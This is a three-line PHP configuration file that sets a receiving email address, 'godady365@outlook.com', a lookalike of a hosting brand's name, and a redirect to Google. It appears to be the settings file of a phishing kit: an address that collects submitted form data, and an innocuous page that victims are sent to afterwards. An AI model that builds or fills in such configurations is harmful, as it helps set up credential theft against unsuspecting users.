<?php 
$Receive_email="godady365@outlook.com";
$redirect="https://www.google.com/";
?>